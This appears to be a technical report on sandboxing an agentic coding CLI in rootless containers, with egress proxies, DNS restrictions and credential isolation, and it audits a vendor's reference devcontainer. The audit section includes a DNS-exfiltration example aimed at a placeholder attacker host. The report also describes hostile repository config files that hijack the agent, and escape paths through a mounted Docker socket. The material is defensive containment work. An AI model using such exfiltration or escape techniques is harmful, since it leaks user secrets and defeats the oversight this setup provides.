---
title: "Containers as the containment layer for `claude --dangerously-skip-permissions`"
date: 2026-07-30
depth: standard
format: md
topic: "Containerized dev environments for running an agentic coding CLI on a Linux host (2026). Compare rootless Podman vs rootless Docker vs Docker with the default daemon vs Dev Containers (devcontainer.json / `devcontainer` CLI) vs Claude Code's own devcontainer reference image, as the containment layer for `claude --dangerously-skip-permissions`. Axes: isolation strength (user namespaces, `--userns`, seccomp/AppArmor defaults, what a container escape actually needs), workspace mounting patterns (bind-mount the repo only vs the whole home; `:z`/SELinux labels; UID mapping and file-ownership pain on rootless), credential passthrough without leaking the host keyring, network egress allowlisting (iptables/nftables init-firewall scripts, an HTTP proxy like mitmproxy/squid, `--network=none` plus a proxy sidecar, and which domains Claude Code actually needs), Docker socket exposure as an anti-pattern, and day-to-day friction (rebuild time, dev server port publishing, git identity). Note that Anthropic ships a reference devcontainer with a firewall script — evaluate it. Give a concrete recommended setup with the Dockerfile/compose/devcontainer snippets that matter."
topic_raw: "switching from windows to linux. on my system, I'm also going to run Claude. for my homelab I'm using proxmox on the minipc to \"separate\" systems. for running claude \"safely\", what can I do there?"
tags: [claude-code, containers, podman, docker, devcontainers, sandboxing, egress-filtering, linux]
summary: "Rootless Podman plus a proxy-only internal network beats Anthropic's reference devcontainer; the reference firewall leaks DNS and hands the agent NET_ADMIN."
citations: 34
reading_time_min: 12
cover: cover.svg
model: "Opus 5"
cost_usd: "sub"
duration_sec: 683
issue: 12
---

> **Decision.** Use **rootless Podman** with `--userns=keep-id`, the repo as the only bind mount, and **network egress via a proxy sidecar on an `--internal` network** — not the `NET_ADMIN` + `iptables` pattern Anthropic's reference devcontainer uses. Anthropic's devcontainer is a good *shape* but a weak *boundary*: it allows unrestricted outbound DNS [[4]](https://github.com/anthropics/claude-code/issues/36907), allowlists all of GitHub's CIDR space, and grants the agent's own container `CAP_NET_ADMIN` [[14]](https://github.com/anthropics/claude-code/blob/main/.devcontainer/devcontainer.json). If the repo is genuinely untrusted, skip containers and use a Proxmox VM — Anthropic says the same [[1]](https://code.claude.com/docs/en/sandbox-environments).

Containment matters here even if you trust the model: three disclosed Claude Code flaws achieved command execution or API-key exfiltration purely from repository-local config files (`.claude/settings.json`, `.mcp.json`, `ANTHROPIC_BASE_URL`) — "configuration files effectively become part of the execution layer" [[29]](https://thehackernews.com/2026/02/claude-code-flaws-allow-remote-code.html). A container turns "cloned a hostile repo" from a host compromise into a workspace compromise.

## The five options, compared

| Layer | Escape → attacker gets | Bind-mount UID sanity | MAC (SELinux/AppArmor) | Egress control | Friction |
|---|---|---|---|---|---|
| Docker, default daemon | host **root** (daemon is root) | ✓ trivial, UIDs are real | ✓ AppArmor `docker-default` / SELinux | ✓ `NET_ADMIN` or proxy both work | lowest |
| Rootless Docker | your host user only [[7]](https://docs.docker.com/engine/security/rootless/) | ✗ worst of the five (see below) [[18]](https://github.com/moby/moby/issues/45919) | ✗ AppArmor unsupported [[7]](https://docs.docker.com/engine/security/rootless/) | ⚠ in-container iptables fragile | medium |
| **Rootless Podman** ⭐ 32k | your host user only [[12]](https://blog.nviso.eu/2026/02/03/rootless-containers-with-podman/) | ✓ `--userns=keep-id` [[19]](https://oneuptime.com/blog/post/2026-03-17-use-userns-keep-id-option-podman/view) | ✓ `container_t` even rootless [[13]](https://oneuptime.com/blog/post/2026-03-04-rootless-pods-selinux-confinement-rhel-9/view) | ✓ `--internal` network + proxy [[24]](https://docs.podman.io/en/latest/markdown/podman-network-create.1.html) | medium |
| Dev Containers (spec) | whatever the engine underneath gives | engine-dependent | engine-dependent | you write it | low, but IDE channel is a hole [[25]](https://github.com/mattolson/agent-sandbox) |
| Anthropic reference devcontainer | host root (assumes rootful Docker) | ✓ | ✓ | ⚠ leaks DNS + all of GitHub [[3]](https://github.com/anthropics/claude-code/blob/main/.devcontainer/init-firewall.sh) [[4]](https://github.com/anthropics/claude-code/issues/36907) | lowest |

Dev Containers is not a fourth *isolation* technology — [`devcontainer.json`](https://containers.dev/) is a portable description of an environment [[31]](https://containers.dev/) that the [devcontainer CLI](https://github.com/devcontainers/cli) ⭐ 2.9k (Jul 2026) [[32]](https://github.com/devcontainers/cli) or your editor materialises on top of Docker or Podman. Treat it as packaging; the security properties come from the engine and the `runArgs` you put in it.

## What a container escape actually needs

Brief kernel-level orientation, because it decides how much rootless buys you:

- **User namespaces** give a process a private UID mapping. Rootless Podman maps container UID 0 to your host UID and container UIDs 1+ into your `/etc/subuid` range [[12]](https://blog.nviso.eu/2026/02/03/rootless-containers-with-podman/); rootless Docker does the same for the daemon and containers, requiring ≥65536 subordinate IDs [[7]](https://docs.docker.com/engine/security/rootless/). Net effect: a full escape lands you as *you*, not root. Since your home directory, SSH keys and `sudo` rights all belong to *you*, that is a smaller win on a single-user workstation than it is on a server.
- **seccomp** filters syscalls. The default Docker profile blocks ~44 of 300+, including `mount`, `unshare`, `keyctl`, `bpf`, `ptrace` and the module-loading calls [[10]](https://docs.docker.com/engine/security/seccomp/). This is why `unshare` returns `Operation not permitted` in a stock container, and why CVE-2022-0185 — which needed `unshare` — was not exploitable from one [[11]](https://securitylabs.datadoghq.com/articles/container-security-fundamentals-part-6/). Keeping the default profile is worth more than most hand-written hardening.
- **MAC** (AppArmor or SELinux) is the second wall if seccomp is bypassed. Rootless Docker **cannot** use AppArmor [[7]](https://docs.docker.com/engine/security/rootless/). Podman labels container processes `container_t` and applies the same confinement rootless as rootful [[13]](https://oneuptime.com/blog/post/2026-03-04-rootless-pods-selinux-confinement-rhel-9/view) — on Fedora/RHEL that is a real differentiator; on Ubuntu, where AppArmor is the MAC in play, rootless Docker gives you neither.
- **The trade nobody advertises:** rootless mode swaps daemon-root risk for a *larger* unprivileged-user-namespace attack surface. Qualys published three bypasses of Ubuntu's unprivileged-namespace restrictions in 2025, and user-namespace CVEs kept landing through 2026 [[8]](https://www.kenmuse.com/blog/rootless-docker-and-its-hidden-security-trade-offs/). A 2026 comparative study of AI-code-sandbox engines puts runc/Docker at the largest attack surface and Firecracker at the lowest CVE velocity, concluding "no single solution optimizes all security dimensions" [[9]](https://arxiv.org/pdf/2606.08433).

Practical reading: containers are a good blast-radius reducer against a *hostile repo*, not a boundary you'd bet on against a *targeted kernel exploit*. That's the VM's job.

## Auditing Anthropic's reference devcontainer

Three files: `devcontainer.json`, a `node:20` Dockerfile, and `init-firewall.sh` [[2]](https://code.claude.com/docs/en/devcontainer). What it gets right:

- Workspace-only bind mount: `source=${localWorkspaceFolder},target=/workspace,type=bind,consistency=delegated` — the host home is not mounted [[14]](https://github.com/anthropics/claude-code/blob/main/.devcontainer/devcontainer.json).
- `~/.claude` and shell history live in **per-devcontainer named volumes** (`claude-code-config-${devcontainerId}`), so credentials survive rebuilds without touching the host filesystem, with `CLAUDE_CONFIG_DIR` set so `.claude.json` lands inside the volume too [[2]](https://code.claude.com/docs/en/devcontainer).
- `remoteUser: node`, and the sudo grant is exactly one root-owned script: `node ALL=(root) NOPASSWD: /usr/local/bin/init-firewall.sh` [[15]](https://github.com/anthropics/claude-code/blob/main/.devcontainer/Dockerfile). No general `sudo`, no writable escalation path.
- Default-deny `OUTPUT`/`INPUT`/`FORWARD` with an `ipset` allowlist, and a self-test that asserts `example.com` fails and `api.github.com/zen` succeeds [[3]](https://github.com/anthropics/claude-code/blob/main/.devcontainer/init-firewall.sh).

Four concrete weaknesses:

1. **DNS is wide open.** `iptables -A OUTPUT -p udp --dport 53 -j ACCEPT` permits queries to *any* resolver, so `dig @attacker-dns $(base64 secret).evil.com` walks straight out of the default-deny firewall. Filed with a repro and a one-line fix (restrict to `127.0.0.11`); closed as **not planned** [[4]](https://github.com/anthropics/claude-code/issues/36907).
2. **The allowlist is enormous.** It ingests `.web`, `.api` and `.git` CIDR blocks from `api.github.com/meta` [[3]](https://github.com/anthropics/claude-code/blob/main/.devcontainer/init-firewall.sh). Those ranges serve gists, arbitrary repos and GitHub Pages — i.e. an agent with a token, or none at all via a public gist, has a fat write channel to the internet. Port 22 is also unconditionally allowed, which is `git push` to anywhere.
3. **The agent's container holds `CAP_NET_ADMIN` and `CAP_NET_RAW`** [[14]](https://github.com/anthropics/claude-code/blob/main/.devcontainer/devcontainer.json). The non-root `node` user cannot use them (added capabilities land in the bounding set, not a non-root process's effective set), so this is defence-in-depth-shaped rather than broken — but any root-in-container bug flushes the whole firewall. Better designs move `NET_ADMIN` out of the agent's container entirely [[5]](https://github.com/VirtusLab/sandcat).
4. **`+ local /24`.** The script allows the detected host network as a `/24` [[3]](https://github.com/anthropics/claude-code/blob/main/.devcontainer/init-firewall.sh). On a homelab LAN that is your Proxmox API, your NAS, your router admin. This is the line to delete first.

Anthropic is explicit that this is "a working example rather than a maintained base image", and that with `--dangerously-skip-permissions` a dev container "does not prevent a malicious project from exfiltrating anything accessible inside the container, including the Claude Code credentials stored in `~/.claude`" [[2]](https://code.claude.com/docs/en/devcontainer).

## Workspace mounting and the rootless UID trap

Mount the repo, nothing else. Not `$HOME`, not `~/.ssh`, not `~/.aws` — Anthropic's own guidance says to prefer repository-scoped or short-lived tokens over mounting host secret files [[2]](https://code.claude.com/docs/en/devcontainer).

On SELinux hosts a bind mount needs a label or the container gets EACCES: `-v $PWD:/workspace:z` (shared label, multiple containers) or `:Z` (private, exclusive). Use `:z` for a repo you also open in a host editor.

Then the trap. **Rootless Docker maps your host UID to container UID 0**, so host files you own appear *root-owned* inside the container and a non-root container user cannot write them [[18]](https://github.com/moby/moby/issues/45919). The obvious fix — run as container root — collides head-on with Claude Code: "The CLI rejects this flag when launched as root" [[2]](https://code.claude.com/docs/en/devcontainer). So rootless Docker + `--dangerously-skip-permissions` + a writable bind-mounted repo is an actual dead end without `chown` gymnastics.

Podman solves it declaratively:

```jsonc
// .devcontainer/devcontainer.json — rootless Podman
"runArgs": ["--userns=keep-id:uid=1000,gid=1000", "--security-opt=label=disable"],
"containerUser": "node",
"updateRemoteUserUID": true
```

`--userns=keep-id` maps your host UID/GID straight through, so container `node` *is* host you and bind-mount ownership just works [[19]](https://oneuptime.com/blog/post/2026-03-17-use-userns-keep-id-option-podman/view) [[20]](https://seandheath.com/posts/vscode-dev-containers-with-rootless-podman/). Drop `label=disable` and use `:z` on the mount if you want to keep SELinux confinement — which you do. For volumes whose ownership is already wrong, `podman unshare chown -R 1000:1000 ./vol` fixes them from inside the mapping.

## Network egress: three architectures, ranked

Claude Code's documented requirements are narrow [[21]](https://code.claude.com/docs/en/network-config):

| Purpose | Hosts |
|---|---|
| Inference + WebFetch preflight | `api.anthropic.com` |
| Sign-in / OAuth refresh | `claude.ai`, `claude.com`, `platform.claude.com` |
| Updates, plugins | `downloads.claude.ai`, `storage.googleapis.com`, `registry.npmjs.org` (npm installs) |
| Docs, release notes | `code.claude.com`, `raw.githubusercontent.com` |
| Optional / droppable | `mcp-proxy.anthropic.com`, `bridge.claudeusercontent.com`, `http-intake.logs.us5.datadoghq.com`, `browser-intake-us5-datadoghq.com`, `formulae.brew.sh` |

Set `CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC=1` and `DISABLE_AUTOUPDATER=1` in `containerEnv` and the last row mostly disappears [[2]](https://code.claude.com/docs/en/devcontainer). Note nothing in that list requires `github.com` — that's for *your* git workflow, and it's the exfil channel. Claude Code honours `HTTPS_PROXY`/`NO_PROXY` and `NODE_EXTRA_CA_CERTS`, but **not** SOCKS [[21]](https://code.claude.com/docs/en/network-config) — which is exactly what a MITM proxy needs.

**Worst → best:**

1. **In-container `iptables` + `NET_ADMIN`** (the Anthropic pattern). IP-level only, so it cannot distinguish `api.anthropic.com` from any other host behind the same CDN IP, cannot see DNS, and the enforcement lives inside the thing being contained. It also barely works rootless: `iptables` in a rootless container needs both `NET_ADMIN` and `NET_RAW`, *and* the `ip_tables`/`xt_*` modules must already be loaded on the host, because module loading needs real root [[16]](https://www.procustodibus.com/blog/2022/10/wireguard-in-podman/) [[17]](https://github.com/containers/podman/issues/12661).
2. **`HTTPS_PROXY` to a filtering proxy** (squid or [mitmproxy](https://mitmproxy.org)). Hostname-aware and loggable, but opt-in: anything that ignores the env var goes direct.
3. **Isolated network + proxy as the only exit.** Compose's `internal: true` "lets you create an externally isolated network" [[22]](https://docs.docker.com/reference/compose-file/networks/); Podman's `--internal` "restricts external access of this network" [[24]](https://docs.podman.io/en/latest/markdown/podman-network-create.1.html). The agent container has *no route off the box*, so the proxy is not a suggestion. `--network=none` is strictly worse here — with no interface at all the agent cannot reach the proxy either.

⚠ **One gap survives even architecture 3 on Docker:** the embedded resolver at `127.0.0.11` forwards names it cannot answer to the *host's* upstream resolvers [[23]](https://oneuptime.com/blog/post/2026-02-08-how-to-use-docker-embedded-dns-server/view), so DNS tunnelling still exits an `internal: true` network. Fix it by pointing the container at your own resolver (`dns:` in compose) and having that resolver answer only allowlisted names — non-permitted domains resolve to a placeholder IP [[34]](https://github.com/agentcage/agentcage). Podman sidesteps it: `--internal` disables the DNS plugin outright, so you must supply `--dns` explicitly [[24]](https://docs.podman.io/en/latest/markdown/podman-network-create.1.html).

Three implementations worth copying rather than reinventing:

- [sandcat](https://github.com/VirtusLab/sandcat) ⭐ 171 (Jul 2026) — devcontainer + compose. mitmproxy in WireGuard mode; a `wg-client` sidecar holds `NET_ADMIN` and the agent container **shares its network namespace**, inheriting the tunnel with no capabilities of its own. Rules are first-match-wins deny-by-default (`{"action":"allow","host":"api.anthropic.com","method":"POST"}`), DNS is evaluated against the same ruleset, and secrets are `SANDCAT_PLACEHOLDER_*` env vars the proxy substitutes for allowed hosts only [[5]](https://github.com/VirtusLab/sandcat).
- [agentcage](https://agentcage.ai/) ⭐ 21 (Jul 2026) — rootless Podman `--internal` network with no gateway, plus dnsmasq and transparent-mitmproxy sidecars; MIT, fail-closed, inspector chain over requests, WebSocket frames and DNS queries [[6]](https://agentcage.ai/) [[34]](https://github.com/agentcage/agentcage).
- [agent-sandbox](https://github.com/mattolson/agent-sandbox) ⭐ 194 (Jul 2026) — same two-layer idea; notable for documenting that **the IDE's devcontainer management channel is a control plane outside the firewall**, and that a broad PAT reaches every repo the account can [[25]](https://github.com/mattolson/agent-sandbox).

## Credentials, without the host keyring

The named-volume pattern from the reference config is the right default — `~/.claude` in a volume, `CLAUDE_CONFIG_DIR` pointing at it, keyed on `${devcontainerId}` so repos don't share one token store [[2]](https://code.claude.com/docs/en/devcontainer). The host keyring is simply never mounted.

For everything else, prefer proxy-side injection over passing tokens into the agent's environment: sandcat and agent-sandbox both keep real secrets in the proxy container and give the agent placeholders [[5]](https://github.com/VirtusLab/sandcat) [[25]](https://github.com/mattolson/agent-sandbox). A stolen `~/.claude` token is annoying; a stolen broad-scope GitHub PAT is a supply-chain incident.

⚠ **Turn off VS Code's git credential sharing.** Dev Containers copies your host `.gitconfig` in, reuses your host credential helper ("Credentials you've entered locally will be reused in the container"), and **forwards your host SSH agent** automatically [[28]](https://code.visualstudio.com/remote/advancedcontainers/sharing-git-credentials). That is a convenience feature that hands an unattended agent your push rights to everything. Either accept that and keep the agent read-only on the network, or set `git` identity via `containerEnv` (`GIT_AUTHOR_NAME`, `GIT_AUTHOR_EMAIL`, `GIT_COMMITTER_*`), let the agent commit but never push, and push from the host yourself.

## Docker socket: don't

Bind-mounting `/var/run/docker.sock` is host root by another name — the container can just start a `--privileged` sibling [[26]](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security/abusing-docker-socket-for-privilege-escalation.html). It defeats every other control on this page, and it is *not* redeemed by rootless mode: rootless just makes the socket equal to your user rather than root, which on a workstation is the account that matters. Even purpose-built guards leak — CVE-2026-6406 bypassed Docker Desktop's Enhanced Container Isolation because `--use-api-socket` mounts the socket via `HostConfig.Mounts` while the policy check only inspected `HostConfig.Binds` [[27]](https://www.sentinelone.com/vulnerability-database/cve-2026-6406/). If the agent needs to build images, give it rootless Podman *inside* the container (`podman` in `podman`) or a separate builder it talks to over a proxied API — never the outer socket.

## Recommended setup

Rootless Podman, agent on an internal network, mitmproxy as the only exit, `NET_ADMIN` nowhere near the agent.

```bash
# once, on the host — rootless Podman prerequisites
sudo apt install podman podman-compose uidmap slirp4netns
grep "$USER" /etc/subuid /etc/subgid   # must exist, >=65536 IDs
systemctl --user enable --now podman.socket
podman network create --internal --disable-dns agent-net
podman network create egress-net
```

```yaml
# compose.yaml
services:
  proxy:
    build: ./proxy                 # mitmproxy + allowlist addon + dnsmasq
    networks: [agent-net, egress-net]
    volumes:
      - ./allowlist.yaml:/etc/proxy/allowlist.yaml:ro,z
      - ~/.config/agent/secrets:/secrets:ro,z   # secrets live HERE, not in the agent
      - proxy-ca:/ca

  agent:
    build: .
    networks: [agent-net]          # no route off the host
    dns: [10.89.1.2]               # the proxy's dnsmasq; allowlist-only answers
    userns_mode: "keep-id:uid=1000,gid=1000"
    cap_drop: [ALL]
    security_opt: [no-new-privileges]
    environment:
      HTTPS_PROXY: http://proxy:8080
      HTTP_PROXY: http://proxy:8080
      NO_PROXY: localhost,127.0.0.1
      NODE_EXTRA_CA_CERTS: /ca/mitmproxy-ca-cert.pem
      CLAUDE_CONFIG_DIR: /home/node/.claude
      CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC: "1"
      DISABLE_AUTOUPDATER: "1"
      GIT_AUTHOR_NAME: "Wouter (agent)"
      GIT_AUTHOR_EMAIL: "agent@localhost"
    volumes:
      - ./:/workspace:z            # the repo, and nothing else
      - claude-config:/home/node/.claude
      - proxy-ca:/ca:ro
    working_dir: /workspace
    command: ["claude", "--dangerously-skip-permissions"]

networks:
  agent-net:
    external: true
  egress-net:
    external: true

volumes:
  claude-config:
  proxy-ca:
```

```dockerfile
# Dockerfile — no iptables, no ipset, no sudo
FROM node:22-bookworm-slim
RUN apt-get update && apt-get install -y --no-install-recommends \
      git ripgrep ca-certificates && rm -rf /var/lib/apt/lists/*
RUN npm install -g @anthropic-ai/claude-code@2.1.220   # pin; auto-update is off
RUN mkdir -p /etc/claude-code
COPY managed-settings.json /etc/claude-code/managed-settings.json
USER node
```

`managed-settings.json` at `/etc/claude-code/managed-settings.json` is read at the highest precedence in the settings hierarchy, above anything the repo's `.claude/` can set [[2]](https://code.claude.com/docs/en/devcontainer) — the right place to pin deny rules that a hostile repo must not be able to widen (which is exactly the class of bug CVE-2025-59536 was [[29]](https://thehackernews.com/2026/02/claude-code-flaws-allow-remote-code.html)).

Want the editor integration too? Wrap the same container in `devcontainer.json` with `"initializeCommand"` creating the networks and the `runArgs` above, and drive it headless with `devcontainer up --workspace-folder .` when you don't want VS Code's management channel in the picture [[32]](https://github.com/devcontainers/cli).

### Day-to-day friction, honestly

- **Rebuilds.** Pin the Claude Code version and install it in a layer above `apt` so a toolchain change doesn't re-download it; the Dev Container Feature always pulls latest, which is why the Dockerfile above uses `npm install -g …@X.Y.Z` [[2]](https://code.claude.com/docs/en/devcontainer).
- **Dev server ports.** An `internal: true`/`--internal` network publishes nothing. Put a second `ports:`-publishing network on the agent *only* when you're actively testing, or reverse-proxy through the sidecar. Rootless engines also can't bind host ports <1024 without `CAP_NET_BIND_SERVICE` on the rootlesskit binary or `net.ipv4.ip_unprivileged_port_start=0` [[7]](https://docs.docker.com/engine/security/rootless/).
- **Resource limits.** Rootless Docker honours `--cpus`/`--memory` only on cgroup v2 + systemd [[7]](https://docs.docker.com/engine/security/rootless/). Worth checking before you let an agent run a build loop unattended.
- **Nested Bash sandbox.** Layering Claude Code's own bubblewrap sandbox inside the container needs a nested-sandbox setting, because default seccomp blocks `unshare` [[1]](https://code.claude.com/docs/en/sandbox-environments) [[10]](https://docs.docker.com/engine/security/seccomp/).

## What none of this stops

The workspace is writable, so anything Claude can read in `/workspace` it can also send to any allowlisted host, and it can rewrite your code [[1]](https://code.claude.com/docs/en/sandbox-environments). Isolation also doesn't change what goes to the model. For a repo you actually distrust, the practitioner and vendor answer converge on the same thing: a separate kernel — a Proxmox VM, a microVM, or Docker Desktop's sandboxes feature [[33]](https://docs.docker.com/ai/sandboxes/) [[30]](https://news.ycombinator.com/item?id=47545715) — with the container pattern above *inside* it.
